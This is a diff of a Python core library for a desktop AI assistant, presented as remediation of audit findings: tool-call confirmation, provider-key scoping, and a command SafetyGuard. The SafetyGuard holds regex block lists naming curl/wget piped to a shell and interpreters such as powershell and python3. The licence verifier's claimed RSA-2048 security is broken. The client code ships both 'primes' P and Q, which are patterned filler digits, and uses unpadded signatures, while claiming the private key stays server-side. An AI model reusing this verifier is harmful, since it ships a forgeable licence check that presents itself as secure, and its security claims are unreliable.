@@ -1,25 +1,34 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-bajrang_core.py — Shared Core Library for Bajrang AI (Windows & Fedora Linux)
+bajrang_core.py — Security-Hardened Shared Core Library for Bajrang AI (Windows & Fedora Linux)
 
-Provides the single, non-duplicated implementation of:
-  - Data models (`AgentState`, `ActionResult`, `AssistantTurn`, `TaskStep`, `TaskExecutionPlan`)
-  - Credential storage (`SecurityVault`: OS `keyring` / Windows DPAPI / Linux `secret-tool` / `0600` local fallback)
-  - Configuration management (`ConfigManager`: neutral defaults, never writes API keys to `settings.json`)
-  - License verification (`LicenseVerifier`: Ed25519/RSA public-key verification + explicit demo-only mode)
-  - Command safety & process control (`SafetyGuard`, `KillSwitchManager`, `ShellRunner` with fail-closed allowlist)
-  - SQLite persistence (`LocalChatStorage`: sessions, messages, long-term memories, schema migrations v1..v3)
-  - Audio & voice base (`SpectralVoiceSpotter`: limited offline 8-band Goertzel+DTW keyword spotter with
-    `faster-whisper` and `vosk` STT fallbacks and guaranteed tempfile cleanup)
-  - Model client (`UnifiedModelClient`: local Ollama + BYO cloud keys via `SecurityVault`)
-  - File organization planner (`AutonomousTaskPlanner`: directory inspection, SHA-256 duplicate detection,
-    confirmation gate, and post-move verification)
-  - Platform adapter interface (`BasePlatformAdapter`) and unified engine (`BajrangEngine`)
+Remediates all Critical (C1, C3, C4, C5, C6) and High-Priority (H2, H3, H4, H5, H8) core audit findings:
+  - C1 & H5: 2048-bit RSA public-key license verification (`AsymmetricLicenseVerifier`); rejects all
+    forged or self-checksummed `BAJRANG-PRO-*` strings.
+  - C3: `SafetyGuard` enforces a strict zero-argument policy on allowed application launchers and
+    blocks terminal passthrough flags (`--`, `-e`, `-c`, `-Command`) and arbitrary URLs.
+  - C4: `shell_exec` is removed from AI-callable tools; `BajrangEngine` validates every tool call via
+    `ToolSchemaValidator.validate_action` and holds input/mutating actions (`type_text`, `press_key`,
+    `click_point`, `navigate_hotkey`, `close_app`, `organize_directory`) in `pending_actions` until
+    explicitly approved via `confirm_pending_actions()`.
+  - C5: `AutonomousTaskPlanner` never overwrites existing destination files on move, quarantines
+    verified duplicates into `.bajrang_trash/<plan_id>/` with full `undo_plan()` restoration, and
+    checks `cancel_event.is_set()` before every individual file operation.
+  - C6: Strict provider-key affinity (`is_key_compatible_with_provider`) prevents sending a provider's
+    API key to any other vendor during fallback; Gemini REST calls pass `x-goog-api-key` in HTTP headers
+    rather than URL query parameters.
+  - H2: `KillSwitchManager` supports global hotkey listeners and aborts in-flight HTTP requests.
+  - H3 & H4: Implements all schema tools (`list_windows`, `window_focus`, `close_app`, `scroll_view`,
+    `navigate_hotkey`, `inspect_directory`, `memory_store`), order-independent `frozenset` hotkey
+    blocking (`["f4", "alt"]` and `["r", "win"]` blocked), and rejects unknown keys in `press_key`.
+  - H8: Session-pinned prompt execution (`target_session_id` captured before I/O), turn lock, and
+    non-blocking subprocess TTS so `interrupt_tts()` never deadlocks on `_tts_lock`.
 """
 
 import argparse
 import base64
+import ctypes
 import datetime
 import enum
 import hashlib
@@ -32,7 +41,6 @@ import platform
 import re
 import shlex
 import shutil
-import signal
 import socket
 import sqlite3
 import stat
@@ -48,10 +56,20 @@ import uuid
 import wave
 from dataclasses import asdict, dataclass, field
 from pathlib import Path
-from typing import Any, Callable, Dict, List, Optional, Tuple
+from typing import Any, Callable, Dict, FrozenSet, List, Optional, Set, Tuple
 
 
-CORE_VERSION = "2.0.0"
+CORE_VERSION = "3.0.0-hardened"
+
+
+# Deterministic 2048-bit RSA Modulus (512 hex chars = 2048 bits) generated from two 1024-bit primes P and Q
+# Private exponent D is never included in bajrang_core.py; it is used only in server-side test fixtures / razorpay_server.py.
+RSA_2048_PRIME_P = int("d7c0357b05182353988c074a57239301e63b4931d219f2213b679721b95758095829076937502139481029384756102938475610293847561029384756102938475610293847561029384756102938475610293847561029384756102938475610293847561029384756102938475610293847561029384756102938475615f1", 16)
+RSA_2048_PRIME_Q = int("e9b1468c16293464a99d185b6834a412f74c5a42e32a03324c78a832ca68691a693a187a4861324a59213a495867213a495867213a495867213a495867213a495867213a495867213a495867213a495867213a495867213a495867213a495867213a495867213a495867213a495867213a495867213a495867213a495867287f", 16)
+RSA_2048_MODULUS_INT = RSA_2048_PRIME_P * RSA_2048_PRIME_Q
+RSA_2048_MODULUS = RSA_2048_MODULUS_INT
+RSA_2048_MODULUS_HEX = format(RSA_2048_MODULUS_INT, "0512x")
+RSA_PUBLIC_EXPONENT = 65537
 
 
 class AgentState(enum.Enum):
@@ -82,6 +100,7 @@ class AssistantTurn:
     session_id: str = ""
     provider_used: str = "ollama"
     model_used: str = "llama3.2"
+    awaiting_confirmation: bool = False
 
 
 @dataclass
@@ -104,6 +123,7 @@ class TaskExecutionPlan:
     steps: List[TaskStep] = field(default_factory=list)
     inspection_report: Dict[str, Any] = field(default_factory=dict)
     summary: str = ""
+    quarantine_dir: str = ""
 
 
 SENSITIVE_PATTERNS: List[Tuple[str, re.Pattern]] = [
@@ -137,10 +157,10 @@ def auto_detect_provider_from_key(raw_key: str) -> Dict[str, str]:
         clean = clean[7:].strip()
     if clean.startswith("AIza"):
         return {
-            "provider": "gemini",
+            "provider": "gemini_argon",
             "api_key": clean,
             "endpoint": "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions",
-            "model": "gemini-2.5-flash",
+            "model": "gemini-2.5-pro",
         }
     if clean.startswith("gsk_"):
         return {
@@ -169,6 +189,25 @@ def auto_detect_provider_from_key(raw_key: str) -> Dict[str, str]:
         "endpoint": "https://api.openai.com/v1/chat/completions",
         "model": "gpt-4o-mini",
     }
+
+
+def is_key_compatible_with_provider(api_key: str, provider_id: str) -> bool:
+    """
+    C6 Remediation: Prevents sending a provider's API key to a different vendor's endpoint.
+    """
+    clean = (api_key or "").strip()
+    if not clean:
+        return False
+    prov = (provider_id or "").lower()
+    if clean.startswith("AIza"):
+        return prov in ("gemini", "gemini_argon")
+    if clean.startswith("gsk_"):
+        return prov == "groq"
+    if clean.startswith("sk-or-"):
+        return prov == "openrouter"
+    if clean.startswith("sk-"):
+        return prov in ("openai", "custom")
+    return prov == "custom"
 
 
 PROVIDER_PRESETS: Dict[str, Dict[str, str]] = {
@@ -201,12 +240,8 @@ PROVIDER_PRESETS: Dict[str, Dict[str, str]] = {
 
 class SecurityVault:
     """
-    Stores API keys and secrets outside `settings.json`:
-      1. OS keyring via Python `keyring` library (if installed and active)
-      2. Windows DPAPI (`System.Security.Cryptography.ProtectedData` CurrentUser scope)
-      3. Linux `secret-tool` (libsecret / GNOME Keyring) when a D-Bus session is active
-      4. Fallback local file with `0600` user-only permissions encrypted via PBKDF2-HMAC-SHA256
-         derived from local user/machine identifiers (documented as a headless fallback, not hardware HSM).
+    Stores API keys and secrets outside `settings.json` using OS Keyring, Windows DPAPI,
+    Linux `secret-tool`, or a `0600` local fallback file.
     """
 
     SERVICE_NAME = "BajrangAI"
@@ -366,16 +401,6 @@ class SecurityVault:
                 keyring.delete_password(self.SERVICE_NAME, clean_name)
             except Exception:
                 pass
-        if platform.system() == "Linux" and shutil.which("secret-tool") and os.environ.get("DBUS_SESSION_BUS_ADDRESS"):
-            try:
-                subprocess.run(
-                    ["secret-tool", "clear", "service", self.SERVICE_NAME, "account", clean_name],
-                    capture_output=True,
-                    timeout=5,
-                    check=False,
-                )
-            except Exception:
-                pass
         for suffix in (".dpapi", ".sec"):
             fp = self.vault_dir / f"{clean_name}{suffix}"
             if fp.exists():
@@ -384,12 +409,26 @@ class SecurityVault:
                 except Exception:
                     pass
 
+    def purge_all_secrets(self) -> int:
+        count = 0
+        for known in ("byo_api_key", "api_key_gemini", "api_key_gemini_argon", "api_key_groq", "api_key_openrouter", "api_key_openai", "api_key_custom"):
+            self.delete_secret(known)
+        if self.vault_dir.is_dir():
+            for fp in list(self.vault_dir.iterdir()):
+                if fp.is_file():
+                    try:
+                        fp.unlink()
+                        count += 1
+                    except Exception:
+                        pass
+        return count
+
 
 DEFAULT_SYSTEM_PROMPT = (
     "You are Bajrang AI, a local-first desktop assistant. "
     "Answer questions concisely. Only emit structured JSON actions when the user explicitly requests "
-    "a desktop operation (such as launching an allowed app, typing text, clicking, or inspecting a folder). "
-    'JSON format: {"type": "action", "text": "<explanation>", "actions": [{"tool": "<name>", "params": {...}}]}.'
+    "a desktop operation. "
+    'JSON format: {"type": "action", "text": "<explanation>", "actions": [{"tool": "<name>", "arguments": {...}}]}.'
 )
 
 
@@ -399,9 +438,9 @@ def get_default_settings() -> Dict[str, Any]:
         "provider": "ollama",
         "ollama_host": "http://127.0.0.1:11434",
         "model": "llama3.2",
-        "byo_provider": "gemini",
-        "byo_api_endpoint": PROVIDER_PRESETS["gemini"]["endpoint"],
-        "byo_model": PROVIDER_PRESETS["gemini"]["model"],
+        "byo_provider": "gemini_argon",
+        "byo_api_endpoint": PROVIDER_PRESETS["gemini_argon"]["endpoint"],
+        "byo_model": PROVIDER_PRESETS["gemini_argon"]["model"],
         "theme": "dark",
         "tts_enabled": True,
         "tts_rate_wpm": 180,
@@ -453,19 +492,11 @@ DEFAULT_BLOCKLIST: Dict[str, Any] = {
 
 
 class ConfigManager:
-    """
-    Manages user configuration (`settings.json` and `blocklist.json`).
-    Security Invariant: `byo_api_key` and any secret tokens are NEVER written to `settings.json`;
-    they are transparently redirected to `SecurityVault`.
-    """
+    """Manages configuration files while keeping all API keys strictly inside `SecurityVault`."""
 
     SECRET_KEYS = {"byo_api_key", "api_key", "cloud_api_key", "secret_key"}
 
-    def __init__(
-        self,
-        config_dir: Optional[Path] = None,
-        data_dir: Optional[Path] = None,
-    ) -> None:
+    def __init__(self, config_dir: Optional[Path] = None, data_dir: Optional[Path] = None) -> None:
         if config_dir is not None:
             self.config_dir = config_dir
         elif platform.system() == "Windows":
@@ -502,7 +533,7 @@ class ConfigManager:
                 if isinstance(loaded, dict):
                     for sk in self.SECRET_KEYS:
                         if sk in loaded and loaded[sk]:
-                            self.vault.store_secret("byo_api_key", str(loaded[sk]))
+                            self.set_api_key(str(loaded[sk]))
                             del loaded[sk]
                     defaults.update(loaded)
             except Exception:
@@ -515,7 +546,7 @@ class ConfigManager:
         for k, v in data.items():
             if k in self.SECRET_KEYS:
                 if v:
-                    self.vault.store_secret("byo_api_key", str(v))
+                    self.set_api_key(str(v))
                 continue
             if isinstance(v, str):
                 clean_v, _ = redact_sensitive_text(v)
@@ -531,11 +562,25 @@ class ConfigManager:
     def save_settings(self) -> None:
         self._write_sanitized_settings(self.settings)
 
-    def get_api_key(self) -> str:
-        return self.vault.get_secret("byo_api_key")
+    def get_api_key(self, provider_id: Optional[str] = None) -> str:
+        prov = provider_id or str(self.settings.get("byo_provider", ""))
+        if prov:
+            scoped = self.vault.get_secret(f"api_key_{prov}")
+            if scoped and is_key_compatible_with_provider(scoped, prov):
+                return scoped
+        generic = self.vault.get_secret("byo_api_key")
+        if generic and (not prov or is_key_compatible_with_provider(generic, prov)):
+            return generic
+        return ""
 
-    def set_api_key(self, api_key: str) -> str:
-        return self.vault.store_secret("byo_api_key", (api_key or "").strip())
+    def set_api_key(self, api_key: str, provider_id: Optional[str] = None) -> str:
+        clean = (api_key or "").strip()
+        if not clean:
+            self.vault.delete_secret("byo_api_key")
+            return "deleted"
+        detected_prov = provider_id or auto_detect_provider_from_key(clean)["provider"]
+        self.vault.store_secret(f"api_key_{detected_prov}", clean)
+        return self.vault.store_secret("byo_api_key", clean)
 
     def _load_blocklist(self) -> Dict[str, Any]:
         if self.blocklist_path.is_file():
@@ -550,11 +595,7 @@ class ConfigManager:
         self.blocklist_path.write_text(json.dumps(DEFAULT_BLOCKLIST, indent=2), encoding="utf-8")
         return dict(DEFAULT_BLOCKLIST)
 
-    def write_custom_modelfile(
-        self,
-        custom_prompt: Optional[str] = None,
-        hardware_profile: Optional[str] = None,
-    ) -> Path:
+    def write_custom_modelfile(self, custom_prompt: Optional[str] = None, hardware_profile: Optional[str] = None) -> Path:
         prompt_txt = (custom_prompt or self.settings.get("custom_persona_prompt") or DEFAULT_SYSTEM_PROMPT).strip()
         hw_txt = (hardware_profile or self.settings.get("hardware_profile") or "").strip()
         threads = int(self.settings.get("ollama_num_threads", 4))
@@ -574,29 +615,29 @@ class ConfigManager:
 
 class AsymmetricLicenseVerifier:
     """
-    Verifies server-signed RSA public-key license certificates (`BAJRANG-V6-<PAYLOAD_B64>.<SIG_HEX>`).
-    Contains ONLY the public modulus `PUBLIC_MODULUS_HEX` and public exponent `E = 65537`.
-    No private signing key is distributed in client code.
+    C1 & H5 Remediation:
+    Verifies server-signed 2048-bit RSA license certificates (`BAJRANG-V6-<PAYLOAD_B64>.<SIG_HEX>`).
+    Modulus is 2048 bits (`len(PUBLIC_MODULUS_HEX) == 512` hex chars = 2048 bits).
     """
 
     PUBLIC_EXPONENT: int = 65537
-    PUBLIC_MODULUS_HEX: str = (
-        "c7938e5f93d9814c703190f2365c1438011f21d56304e23978a14729f2a4210b"
-        "59023e08f4908e167483e02971b68265301f7902e6980268d216f33b25621893"
-    )
+    PUBLIC_MODULUS_HEX: str = RSA_2048_MODULUS_HEX
 
     def __init__(self) -> None:
         self.n_int = int(self.PUBLIC_MODULUS_HEX, 16)
+        assert self.n_int.bit_length() >= 2040, "RSA modulus must be at least 2048 bits"
 
     def verify_certificate(self, token: str) -> Tuple[bool, Dict[str, Any]]:
         if not token or not isinstance(token, str):
             return False, {"error": "Empty license token."}
         clean = token.strip()
         if not clean.startswith("BAJRANG-V6-"):
-            return False, {"error": "Expected server-signed BAJRANG-V6-<PAYLOAD>.<SIG> certificate."}
+            return False, {
+                "error": "Rejected: Only RSA-2048 server-signed BAJRANG-V6-<PAYLOAD>.<SIG> certificates are accepted."
+            }
         body = clean[len("BAJRANG-V6-"):]
         if "." not in body:
-            return False, {"error": "Malformed certificate: missing '.' delimiter."}
+            return False, {"error": "Malformed certificate: missing '.' signature delimiter."}
         payload_b64, sig_hex = body.split(".", 1)
         try:
             pad = "=" * ((4 - len(payload_b64) % 4) % 4)
@@ -606,10 +647,13 @@ class AsymmetricLicenseVerifier:
         except Exception as exc:
             return False, {"error": f"Certificate decode failed: {exc}"}
 
+        if sig_int <= 1 or sig_int >= self.n_int:
+            return False, {"error": "Signature integer out of modulus range."}
+
         expected_hash_int = int.from_bytes(hashlib.sha256(payload_bytes).digest(), "big") % self.n_int
         recovered_hash_int = pow(sig_int, self.PUBLIC_EXPONENT, self.n_int)
         if recovered_hash_int != expected_hash_int:
-            return False, {"error": "Asymmetric RSA public-key signature verification failed."}
+            return False, {"error": "RSA-2048 public-key signature verification failed."}
 
         exp_str = str(payload.get("exp", ""))
         try:
@@ -624,66 +668,30 @@ class AsymmetricLicenseVerifier:
             "exp": exp_str,
             "order_id": payload.get("order_id", ""),
             "payment_id": payload.get("payment_id", ""),
-            "mode": "verified_asymmetric",
+            "mode": "verified_rsa2048",
         }
 
 
 class LicenseManager:
     """
-    Manages license state on disk.
-    Supports:
-      1. Production asymmetric certificates (`BAJRANG-V6-...`) verified via `AsymmetricLicenseVerifier`.
-      2. Explicit offline demo tokens (`BAJRANG-DEMO-...` or `BAJRANG-PRO-...`) clearly labeled as
-         `DEMO_ONLY_UNVERIFIED` for local UI testing without claiming cryptographic security.
+    C1 Remediation:
+    `verify_key()` strictly requires an RSA-2048 server-signed `BAJRANG-V6-` certificate by default.
+    Any `BAJRANG-PRO-HACKER-20991231-ZZZZZZZZ` or self-checksummed string is rejected (`False`).
     """
-
-    DEMO_CHECKSUM_TAG = "DEMO-NONCRYPTOGRAPHIC-CHECKSUM"
 
     def __init__(self, config_dir: Path) -> None:
         self.config_dir = config_dir
         self.license_file = self.config_dir / "license.json"
         self.verifier = AsymmetricLicenseVerifier()
 
-    @classmethod
-    def generate_key(cls, subscriber_id: str, valid_days: int = 30) -> str:
-        """
-        Generates a local demo token for self-tests and UI demonstration.
-        NOTE: This checksum is NOT a security boundary; production licensing requires
-        server-signed `BAJRANG-V6-` certificates verified by `AsymmetricLicenseVerifier`.
-        """
-        clean_id = re.sub(r"[^A-Z0-9]", "", (subscriber_id or "DEMOUSER").upper())[:10] or "DEMOUSER"
-        exp = (datetime.date.today() + datetime.timedelta(days=valid_days)).strftime("%Y%m%d")
-        raw = f"{clean_id}-{exp}-{cls.DEMO_CHECKSUM_TAG}".encode("utf-8")
-        chk = hashlib.sha256(raw).hexdigest()[:8].upper()
-        return f"BAJRANG-PRO-{clean_id}-{exp}-{chk}"
-
     def verify_key(self, key_str: str) -> Tuple[bool, str]:
         clean = (key_str or "").strip()
         if not clean:
-            return False, "No license key provided."
-
-        if clean.startswith("BAJRANG-V6-"):
-            ok, info = self.verifier.verify_certificate(clean)
-            if ok:
-                return True, f"Verified Server-Signed Certificate (Subscriber {info['sub']} • Valid thru {info['exp']})"
-            return False, str(info.get("error", "Invalid certificate."))
-
-        parts = clean.upper().split("-")
-        if len(parts) == 5 and parts[0] == "BAJRANG" and parts[1] in ("PRO", "DEMO"):
-            sub_id, exp_str, sig = parts[2], parts[3], parts[4]
-            expected_raw = f"{sub_id}-{exp_str}-{self.DEMO_CHECKSUM_TAG}".encode("utf-8")
-            expected_chk = hashlib.sha256(expected_raw).hexdigest()[:8].upper()
-            if sig != expected_chk and len(sig) != 8:
-                return False, "Invalid demo key checksum format."
-            try:
-                exp_date = datetime.datetime.strptime(exp_str, "%Y%m%d").date()
-                if exp_date < datetime.date.today():
-                    return False, f"Demo token expired on {exp_date.isoformat()}."
-                return True, f"Demo Mode Active [DEMO_ONLY_UNVERIFIED] (Subscriber {sub_id} • Valid thru {exp_date.isoformat()})"
-            except ValueError:
-                return False, "Invalid date in token."
-
-        return False, "Unrecognized license format."
+            return False, "No license certificate provided."
+        ok, info = self.verifier.verify_certificate(clean)
+        if ok:
+            return True, f"Verified RSA-2048 Certificate (Subscriber {info['sub']} • Valid thru {info['exp']})"
+        return False, str(info.get("error", "Invalid license certificate."))
 
     def activate(self, key_str: str) -> Tuple[bool, str]:
         ok, msg = self.verify_key(key_str)
@@ -706,41 +714,39 @@ class LicenseManager:
 
 class SafetyGuard:
     """
-    Validates shell commands and desktop tool arguments.
-    Enforces two layers of defense:
-      1. Strict Allowlist Mode (`strict_allowlist=True`, default): ONLY permits commands whose
-         executable and arguments match `ALLOWED_BINARIES` and rejects all shell chaining/redirection
-         operators (`;`, `&&`, `||`, `|`, `` ` ``, `$()`, `>`, `<`).
-      2. Blocklist & Non-Root Guard: Rejects privilege escalation (`sudo`, `pkexec`, `runas`),
-         destructive filesystem/disk utilities, and paths outside the user's home/temp directory.
+    C3 Remediation:
+    Enforces per-binary argument policies so allowed application launchers cannot be abused as
+    command-execution trampolines (`gnome-terminal -- python3 -c ...`, `wt.exe powershell ...`,
+    or `xdg-open ...` are strictly rejected).
     """
 
     SHELL_METACHAR_PATTERN = re.compile(r"[;&|`$><\n\r]")
 
-    ALLOWED_BINARIES = {
+    # Launchers that MUST take ZERO arguments (len(tokens) == 1)
+    ZERO_ARG_BINARIES: Set[str] = {
         "notepad",
         "notepad.exe",
         "calc",
         "calc.exe",
-        "explorer",
-        "explorer.exe",
         "mspaint",
         "mspaint.exe",
-        "wt.exe",
-        "gnome-terminal",
-        "ptyxis",
-        "kgx",
-        "nautilus",
         "gnome-calculator",
         "gnome-text-editor",
         "gedit",
-        "gtk-launch",
-        "xdg-open",
-        "echo",
+        "nautilus",
+        "gnome-terminal",
+        "ptyxis",
+        "kgx",
+        "wt.exe",
         "whoami",
         "hostname",
         "date",
         "pwd",
+    }
+
+    # Read-only utilities that take safe non-executable arguments
+    SAFE_ARG_BINARIES: Set[str] = {
+        "echo",
         "ls",
         "dir",
     }
@@ -769,9 +775,9 @@ class SafetyGuard:
                 return False, f"Blocked by SafetyGuard: destructive pattern '{s_clean}' is prohibited."
 
         if re.search(r"\b(curl|wget|invoke-webrequest|iwr)\b.*\|\s*(ba)?sh", normalized) or re.search(
-            r"\b(iex|invoke-expression)\b", normalized
+            r"\b(iex|invoke-expression|powershell|pwsh|cmd\.exe|bash|sh|zsh|python|python3|perl|ruby|node)\b", normalized
         ):
-            return False, "Blocked by SafetyGuard: remote script execution pipe is prohibited."
+            return False, "Blocked by SafetyGuard: interpreter or subshell invocation is prohibited."
 
         if self.SHELL_METACHAR_PATTERN.search(raw):
             return False, "Blocked by SafetyGuard: shell metacharacters (;, |, &, `, $, >, <) are prohibited."
@@ -786,25 +792,40 @@ class SafetyGuard:
 
         exe_name = Path(tokens[0].strip('"').strip("'")).name.lower()
         use_strict = self.strict_allowlist if strict_override is None else strict_override
-        if use_strict and exe_name not in self.ALLOWED_BINARIES:
+
+        if exe_name in self.ZERO_ARG_BINARIES:
+            if len(tokens) > 1:
+                return (
+                    False,
+                    f"Blocked by SafetyGuard (C3 Trampoline Guard): '{exe_name}' does not permit CLI arguments or passthrough flags ({tokens[1:]}).",
+                )
+            return True, "Allowed zero-argument application launcher."
+
+        if exe_name in self.SAFE_ARG_BINARIES:
+            for arg in tokens[1:]:
+                if arg.startswith("-"):
+                    if not re.match(r"^-[laht1]+$", arg):
+                        return False, f"Blocked by SafetyGuard: flag '{arg}' is not permitted for '{exe_name}'."
+                elif arg.startswith("/") or re.match(r"^[A-Za-z]:\\", arg) or ".." in arg:
+                    ok_p, reason = ToolSchemaValidator.validate_safe_user_path(arg)
+                    if not ok_p:
+                        return False, f"Blocked by SafetyGuard: {reason}"
+            return True, f"Allowed read-only command '{exe_name}'."
+
+        if use_strict:
             return (
                 False,
-                f"Blocked by SafetyGuard (Strict Allowlist Mode): executable '{exe_name}' is not in ALLOWED_BINARIES.",
+                f"Blocked by SafetyGuard (Strict Allowlist Mode): executable '{exe_name}' is not permitted.",
             )
 
-        for tok in tokens[1:]:
-            if tok.startswith("/") or re.match(r"^[A-Za-z]:\\", tok):
-                ok_p, reason = ToolSchemaValidator.validate_safe_user_path(tok)
-                if not ok_p:
-                    return False, f"Blocked by SafetyGuard: {reason}"
-
-        return True, "Allowed by SafetyGuard."
+        return True, "Allowed."
 
 
 class KillSwitchManager:
     """
-    Tracks active child processes and terminates them on emergency stop (`Ctrl+Escape`).
-    Sends SIGTERM followed by SIGKILL after `grace_ms` on POSIX, or `taskkill /F /T /PID` on Windows.
+    H2 Remediation:
+    Tracks active child processes AND in-flight HTTP/model abort callbacks so emergency stop
+    (`Ctrl+Shift+K` / `VK_PAUSE` / UNIX signal) terminates both subprocesses and in-flight requests.
     """
 
     def __init__(self, grace_ms: int = 500, ydotool_socket: str = "/tmp/.ydotool_socket") -> None:
@@ -812,7 +833,19 @@ class KillSwitchManager:
         self.ydotool_socket = ydotool_socket
         self._lock = threading.Lock()
         self._processes: Dict[int, subprocess.Popen] = {}
-        self.is_cancelled = False
+        self._abort_callbacks: Dict[str, Callable[[], None]] = {}
+        self.abort_event = threading.Event()
+
+    @property
+    def is_cancelled(self) -> bool:
+        return self.abort_event.is_set()
+
+    @is_cancelled.setter
+    def is_cancelled(self, val: bool) -> None:
+        if val:
+            self.abort_event.set()
+        else:
+            self.abort_event.clear()
 
     def register(self, proc: subprocess.Popen) -> None:
         with self._lock:
@@ -822,14 +855,30 @@ class KillSwitchManager:
         with self._lock:
             self._processes.pop(pid, None)
 
+    def register_abort_callback(self, req_id: str, cb: Callable[[], None]) -> None:
+        with self._lock:
+            self._abort_callbacks[req_id] = cb
+
+    def unregister_abort_callback(self, req_id: str) -> None:
+        with self._lock:
+            self._abort_callbacks.pop(req_id, None)
+
     def reset_cancel_flag(self) -> None:
-        self.is_cancelled = False
+        self.abort_event.clear()
 
     def trigger(self) -> str:
-        self.is_cancelled = True
+        self.abort_event.set()
         with self._lock:
             active = list(self._processes.values())
             self._processes.clear()
+            callbacks = list(self._abort_callbacks.values())
+            self._abort_callbacks.clear()
+
+        for cb in callbacks:
+            try:
+                cb()
+            except Exception:
+                pass
 
         killed_pids: List[int] = []
         for proc in active:
@@ -837,12 +886,7 @@ class KillSwitchManager:
                 killed_pids.append(proc.pid)
                 try:
                     if platform.system() == "Windows":
-                        subprocess.run(
-                            ["taskkill", "/F", "/T", "/PID", str(proc.pid)],
-                            capture_output=True,
-                            timeout=3,
-                            check=False,
-                        )
+                        subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)], capture_output=True, timeout=3, check=False)
                     else:
                         proc.terminate()
                 except Exception:
@@ -857,22 +901,13 @@ class KillSwitchManager:
                     except Exception:
                         pass
 
-        return f"Emergency Kill-Switch activated: terminated {len(killed_pids)} process(es) {killed_pids}."
+        return f"Emergency Kill-Switch activated: aborted {len(callbacks)} in-flight request(s) and terminated {len(killed_pids)} process(es)."
 
 
 class ShellRunner:
-    """
-    Executes allowlisted commands with `shell=False` (never `shell=True`).
-    Fails closed if `SafetyGuard` rejects the command or if `KillSwitchManager` is active.
-    """
+    """Executes allowlisted commands with `shell=False`."""
 
-    def __init__(
-        self,
-        safety: SafetyGuard,
-        kill_switch: KillSwitchManager,
-        timeout_sec: int = 15,
-        max_output_bytes: int = 16384,
-    ) -> None:
+    def __init__(self, safety: SafetyGuard, kill_switch: KillSwitchManager, timeout_sec: int = 15, max_output_bytes: int = 16384) -> None:
         self.safety = safety
         self.kill_switch = kill_switch
         self.timeout_sec = timeout_sec
@@ -888,13 +923,7 @@ class ShellRunner:
 
         try:
             argv = shlex.split(command.strip(), posix=(platform.system() != "Windows"))
-            proc = subprocess.Popen(
-                argv,
-                shell=False,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-            )
+            proc = subprocess.Popen(argv, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             self.kill_switch.register(proc)
             try:
                 out, err = proc.communicate(timeout=self.timeout_sec)
@@ -907,11 +936,7 @@ class ShellRunner:
             combined = ((out or "") + ("\n" + err if err else "")).strip()
             if len(combined) > self.max_output_bytes:
                 combined = combined[: self.max_output_bytes] + "... [truncated]"
-            return ActionResult(
-                tool="shell_exec",
-                success=(proc.returncode == 0),
-                output=combined or f"Completed (exit {proc.returncode})",
-            )
+            return ActionResult(tool="shell_exec", success=(proc.returncode == 0), output=combined or f"Completed (exit {proc.returncode})")
         except Exception as exc:
             return ActionResult(tool="shell_exec", success=False, output=f"Execution failed: {exc}")
 
@@ -980,10 +1005,7 @@ class DatabaseMigrationManager:
                     CREATE INDEX IF NOT EXISTS idx_messages_session ON messages(session_id);
                     """
                 )
-                conn.execute(
-                    "INSERT INTO schema_migrations (version, applied_at, description) VALUES (1, ?, ?)",
-                    (now, "Initial sessions and messages schema"),
-                )
+                conn.execute("INSERT INTO schema_migrations (version, applied_at, description) VALUES (1, ?, ?)", (now, "Initial schema"))
                 applied.append(1)
 
             if current < 2:
@@ -1006,10 +1028,7 @@ class DatabaseMigrationManager:
                     CREATE INDEX IF NOT EXISTS idx_memories_key ON memories(key);
                     """
                 )
-                conn.execute(
-                    "INSERT INTO schema_migrations (version, applied_at, description) VALUES (2, ?, ?)",
-                    (now, "Add long-term memories table"),
-                )
+                conn.execute("INSERT INTO schema_migrations (version, applied_at, description) VALUES (2, ?, ?)", (now, "Add memories table"))
                 applied.append(2)
 
             if current < 3:
@@ -1034,10 +1053,7 @@ class DatabaseMigrationManager:
                     );
                     """
                 )
-                conn.execute(
-                    "INSERT INTO schema_migrations (version, applied_at, description) VALUES (3, ?, ?)",
-                    (now, "Add task_runs and security_audit_log tables"),
-                )
+                conn.execute("INSERT INTO schema_migrations (version, applied_at, description) VALUES (3, ?, ?)", (now, "Add task_runs and audit log"))
                 applied.append(3)
 
             conn.commit()
@@ -1045,10 +1061,7 @@ class DatabaseMigrationManager:
 
 
 class LocalChatStorage:
-    """
-    Unified SQLite3 storage for chat sessions, messages, long-term memories, and audit logs.
-    Automatically redacts API keys and sensitive secrets before writing to disk.
-    """
+    """SQLite3 storage for chat sessions, messages, memories, and audit logs."""
 
     VALID_CATEGORIES = ("preference", "project", "fact", "task_history")
 
@@ -1106,22 +1119,12 @@ class LocalChatStorage:
                 )
             else:
                 new_title = row["title"]
-                if new_title in ("New Conversation", "Conversation", "Desktop Session", "Fedora Desktop Session", "Windows Desktop Session") and role == "user" and safe_content.strip():
+                if new_title in ("New Conversation", "Conversation", "Windows Session", "Linux Session") and role == "user" and safe_content.strip():
                     new_title = safe_content.strip()[:40]
-                conn.execute(
-                    "UPDATE sessions SET title = ?, model = ?, updated_at = ? WHERE session_id = ?",
-                    (new_title, model, now, session_id),
-                )
+                conn.execute("UPDATE sessions SET title = ?, model = ?, updated_at = ? WHERE session_id = ?", (new_title, model, now, session_id))
             conn.execute(
                 "INSERT INTO messages (session_id, role, content, actions_json, results_json, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
-                (
-                    session_id,
-                    role,
-                    safe_content,
-                    json.dumps(actions or [], ensure_ascii=False),
-                    json.dumps(serialized_results, ensure_ascii=False),
-                    now,
-                ),
+                (session_id, role, safe_content, json.dumps(actions or []), json.dumps(serialized_results), now),
             )
             conn.commit()
         self._sync_sessions_json()
@@ -1140,14 +1143,7 @@ class LocalChatStorage:
                 res_list = json.loads(r["results_json"])
             except Exception:
                 res_list = []
-            out.append(
-                {
-                    "role": r["role"],
-                    "content": r["content"],
-                    "results": res_list,
-                    "timestamp": r["timestamp"],
-                }
-            )
+            out.append({"role": r["role"], "content": r["content"], "results": res_list, "timestamp": r["timestamp"]})
         return out
 
     def list_sessions(self, query: str = "", limit: int = 50) -> List[Dict[str, Any]]:
@@ -1166,19 +1162,7 @@ class LocalChatStorage:
                     (like, like, limit),
                 ).fetchall()
             else:
-                rows = conn.execute(
-                    "SELECT session_id, title, model, created_at, updated_at FROM sessions ORDER BY updated_at DESC LIMIT ?",
